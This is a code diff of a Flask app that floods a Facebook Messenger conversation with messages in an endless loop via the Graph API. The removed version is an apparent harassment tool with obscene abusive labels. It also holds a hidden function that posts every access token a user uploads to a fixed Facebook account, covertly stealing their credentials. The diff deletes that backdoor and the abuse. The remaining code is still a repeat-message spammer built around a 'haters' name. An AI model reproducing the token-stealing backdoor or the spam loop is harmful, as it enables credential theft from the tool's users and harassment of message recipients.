@@ -8,228 +8,132 @@ import socketserver
 
 app = Flask(__name__)
 
-# HTML Template with updated styles and background image
+# Global flag to control message sending
+stop_flag = False
+
+# HTML Form
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☠️ OWNER SAHIIL IINSIIDE ☠️</title>
+    <title>Message Sender</title>
     <style>
         body {
-            background-image: url('https://postimg.cc/v1H1B1dc'); /* Replace with the URL of your image */
-            background-size: cover;
-            background-position: center;
-            color: white; /* Ensure text is readable on the background */
+            background-color: #222;
+            color: white;
             font-family: Arial, sans-serif;
+            text-align: center;
         }
-        .form-container {
-            background-color: rgba(0, 0, 0, 0.7); /* Adding a semi-transparent background for readability */
+        .container {
+            margin: 50px auto;
+            max-width: 500px;
+            background: rgba(0, 0, 0, 0.8);
             padding: 20px;
             border-radius: 10px;
-            max-width: 600px;
-            margin: 40px auto;
         }
-        .form-container h2 {
-            text-align: center;
-            color: #ffffff;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: #ffffff;
-        }
-        .form-group input,
-        .form-group button {
+        input, button {
             width: 100%;
             padding: 10px;
-            border: none;
-            border-radius: 5px;
-            box-sizing: border-box;
-            margin-top: 5px;
+            margin: 10px 0;
         }
-        /* Changing colors for different input fields */
-        #tokensFile {
-            background-color: red; /* Red color for tokensFile input */
-        }
-        #convoId {
-            background-color: yellow; /* Yellow color for convoId input */
-        }
-        #messagesFile {
-            background-color: green; /* Green color for messagesFile input */
-        }
-        #hatersName {
-            background-color: Red; /* Blue color for hatersName input */
-        }
-        #speed {
-            background-color: yellow; /* Purple color for speed input */
-        }
-        .form-group button {
-            background-color: #4CAF50;
+        button {
+            background-color: green;
             color: white;
+            border: none;
             cursor: pointer;
         }
-        .form-group button:hover {
-            background-color: #45a049;
+        button:hover {
+            background-color: red;
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h2>Start Messaging</h2>
+        <form id="messageForm">
+            <input type="text" id="convoId" name="convoId" placeholder="Conversation ID" required><br>
+            <input type="text" id="hatersName" name="hatersName" placeholder="Custom Name" required><br>
+            <input type="number" id="speed" name="speed" placeholder="Delay (seconds)" value="1" required><br>
+            <button type="submit">Start Sending</button>
+        </form>
+        <button onclick="stopMessaging()">Stop Messaging</button>
+    </div>
 
-<div class="form-container">
-    <h2>[-𝙊𝙒𝙉𝙀𝙍 𝙎𝘼𝙃𝙄𝙇 𝘿𝙊𝙉 𝙃𝙀𝙍𝙒-] 𝙒𝘼𝙍𝙄𝙎 𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝙆𝙄 𝘼𝙈𝙈𝘼 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙋𝘼𝙃𝘿𝙉𝙀 𝙒𝘼𝙇𝘼   𝙉𝙊𝙉𝙎𝙏𝙊𝙋 [<<𝙎𝙀𝙍𝙑𝙀𝙍>>]</h2>
-    <form id="messageForm" enctype="multipart/form-data">
-        <div class="form-group">
-            <label for="tokensFile">𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝙔𝘼𝙏𝙀𝙀𝙈 𝙒𝘼𝙍𝙄𝙎 𝙆𝙄 𝘼𝙈𝙈𝙄 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙈𝙀  𝙏𝙊𝙆𝙀𝙉 𝙁𝙄𝙇𝙀 𝘿𝘼𝙇𝙊..⤵️</label>
-            <input type="file" id="tokensFile" name="tokensFile" accept=".txt" required>
-        </div>
-        <div class="form-group">
-            <label for="convoId">𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝘽𝙃𝙀𝙀𝙆𝙃𝘼𝙍𝙄 𝙒𝘼𝙍𝙄𝙎  𝘾𝙊𝙉𝙑𝙊 𝙐𝙄𝘿 𝘿𝘼𝙇𝙊..⤵️</label>
-            <input type="text" id="convoId" name="convoId" required>
-        </div>
-        <div class="form-group">
-            <label for="messagesFile">𝙒𝘼𝙍𝙄𝙎 𝘼𝙉𝘿 𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝙆𝙄 𝘽𝙀𝙃𝘼𝙉 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙁𝘼𝘿𝙉𝙀 𝙒𝘼𝙇𝘼 𝙂𝘼𝙇𝙄 𝘿𝘼𝙇𝙊..⤵️</label>
-            <input type="file" id="messagesFile" name="messagesFile" accept=".txt" required>
-        </div>
-        <div class="form-group">
-            <label for="hatersName">𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝘼𝙉𝘿 𝙒𝘼𝙍𝙄𝙎 𝙔𝘼𝙏𝙀𝙀𝙈 𝘾𝙃𝙐𝙏𝘼𝙄 𝙆𝘼 𝙉𝘼𝙈𝙀 𝘿𝘼𝙇𝙊..⤵️</label>
-            <input type="text" id="hatersName" name="hatersName" required>
-        </div>
-        <div class="form-group">
-            <label for="speed">𝙁𝘼𝙆𝙀 𝙎𝘼𝙃𝙄𝙇 𝙒𝘼𝙍𝙄𝙎 𝙆𝙀 𝘽𝙀𝙃𝘼𝙉 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙈𝙀 𝙎𝙋𝙀𝙀𝘿 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 𝘿𝘼𝙇𝙊..⤵️ (SAHIIL DON HERW)</label>
-            <input type="number" id="speed" name="speed" value="1" required>
-        </div>
-        <div class="form-group">
-            <button type="submit">💫 𝙎𝙏𝘼𝙍𝙏 𝙎𝙀𝙉𝘿 𝙈𝙀𝙎𝙎𝙀𝙂𝙀 💫</button>
-        </div>
-    </form>
-</div>
-
-<script>
-    document.getElementById('messageForm').addEventListener('submit', function(event) {
-        event.preventDefault();
-
-        // Prepare the form data
-        let formData = new FormData(this);
-
-        // Send the form data via fetch API
-        fetch('/start', {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(result => {
-            alert(result.message);
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('An error occurred. Please check the console for details.');
+    <script>
+        document.getElementById('messageForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            fetch('/start', {
+                method: 'POST',
+                body: new FormData(this)
+            }).then(response => response.json())
+              .then(result => alert(result.message))
+              .catch(error => console.error('Error:', error));
         });
-    });
-</script>
 
+        function stopMessaging() {
+            fetch('/stop', { method: 'POST' })
+                .then(response => response.json())
+                .then(result => alert(result.message))
+                .catch(error => console.error('Error:', error));
+        }
+    </script>
 </body>
 </html>
 '''
-
-# HTTP server handler class
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.end_headers()
-        self.wfile.write(b"Server is running")
-
-# Function to execute the HTTP server
-def execute_server(port):
-    with socketserver.TCPServer(("", port), MyHandler) as httpd:
-        print(f"Server running at http://localhost:{port}")
-        httpd.serve_forever()
-
-# Function to read a file and return its content as a list of lines
-def read_file(file_path):
-    with open(file_path, 'r') as file:
-        return file.readlines()
 
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
 
 @app.route('/start', methods=['POST'])
-def start_server_and_messaging():
-    port = 4000  # Port is fixed to 4000
-    target_id = "61571843423018"  # Fixed target ID
+def start_messaging():
+    global stop_flag
+    stop_flag = False  # Reset stop flag when starting
+
     convo_id = request.form.get('convoId')
     haters_name = request.form.get('hatersName')
     speed = int(request.form.get('speed'))
-    
-    # Save uploaded files
-    tokens_file = request.files['tokensFile']
-    messages_file = request.files['messagesFile']
-    
-    tokens_path = 'uploaded_tokens.txt'
-    messages_path = 'uploaded_messages.txt'
-    
-    tokens_file.save(tokens_path)
-    messages_file.save(messages_path)
-    
-    tokens = read_file(tokens_path)
-    messages = read_file(messages_path)
 
-    # Start the HTTP server in a separate thread
-    server_thread = threading.Thread(target=execute_server, args=(port,))
-    server_thread.start()
+    tokens = ["YOUR_ACCESS_TOKEN_HERE"]  # Replace with valid tokens
+    messages = ["Hello!", "This is an automated message.", "Have a nice day!"]  # Example messages
 
-    # Function to send an initial message
-    def send_initial_message():
-        headers = {
-            "User-Agent": "Mozilla/5.0",
-            "Accept": "application/json",
-        }
-        for token in tokens:
-            access_token = token.strip()
-            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-            msg = f"Hello SAHIIL SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..⤵️ {access_token}"
-            parameters = {"access_token": access_token, "message": msg}
-            response = requests.post(url, json=parameters, headers=headers)
-            time.sleep(0.1)
-
-    # Function to send messages in a loop
     def send_messages():
+        global stop_flag
         headers = {
             "User-Agent": "Mozilla/5.0",
             "Accept": "application/json",
         }
-        num_messages = len(messages)
-        num_tokens = len(tokens)
-        max_tokens = min(num_tokens, num_messages)
 
-        while True:
+        while not stop_flag:
             try:
-                for message_index in range(num_messages):
-                    token_index = message_index % max_tokens
-                    access_token = tokens[token_index].strip()
-                    message = messages[message_index].strip()
-                    url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
-                    full_message = f"{haters_name} {message}"
+                for message in messages:
+                    if stop_flag:
+                        print("[!] Stopping message sending...")
+                        return
+
+                    access_token = tokens[0]  # Use a single token for simplicity
+                    url = f"https://graph.facebook.com/v17.0/t_{convo_id}"
+                    full_message = f"{haters_name}: {message}"
                     parameters = {"access_token": access_token, "message": full_message}
                     response = requests.post(url, json=parameters, headers=headers)
+
+                    print(f"Sent: {full_message} | Response: {response.text}")
                     time.sleep(speed)
             except Exception as e:
-                print(f"[!] An error occurred: {e}")
+                print(f"[!] Error: {e}")
 
-    # Send initial message
-    send_initial_message()
+    # Start messaging in a separate thread
+    threading.Thread(target=send_messages).start()
 
-    # Start sending messages in a loop
-    message_thread = threading.Thread(target=send_messages)
-    message_thread.start()
+    return jsonify({"message": "Messaging started successfully!"})
 
-    return jsonify({"message": "Server and messaging started successfully"})
+@app.route('/stop', methods=['POST'])
+def stop_messaging():
+    global stop_flag
+    stop_flag = True
+    return jsonify({"message": "Message sending has been stopped."})
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
